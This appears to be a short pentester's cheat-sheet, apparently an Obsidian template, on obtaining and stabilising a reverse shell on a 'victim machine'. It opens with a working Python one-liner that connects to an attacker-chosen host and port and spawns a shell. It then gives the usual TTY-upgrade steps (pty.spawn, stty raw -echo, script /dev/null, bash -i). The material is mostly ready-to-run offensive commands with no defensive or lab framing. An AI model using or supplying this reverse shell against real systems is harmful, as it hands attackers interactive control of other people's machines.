#### got script unstable shell? 
send a reverse shell like that 
```powershell
export RHOST="<% tp.frontmatter["LHOST"] %>";export RPORT=135;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

#### got the shell already? 
**stabilize the shell**
```sh
# On victim machine
which python3
which python

python3 -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'
```
Send the shell to the background.

```powershell
CTRL-Z
```
Set TTY so we can have autocomplete, etc.
```powershell
stty raw -echo; fg
```
Set the rows and columns of the TTY.
```powershell
stty rows 85 cols 188
```
Set the environment variable.
```powershell
export TERM=xterm
```
Now we should have a fully functional shell.


#### no python available on the machine? 
1- 
```powershell
export TERM=xterm
```

2- cleans shell ( creates a empty script file and start a new shell without and envrionment.. 
```powershell
sricpt /dev/null
````
3- 
```powershell
/bin/bash -i
```


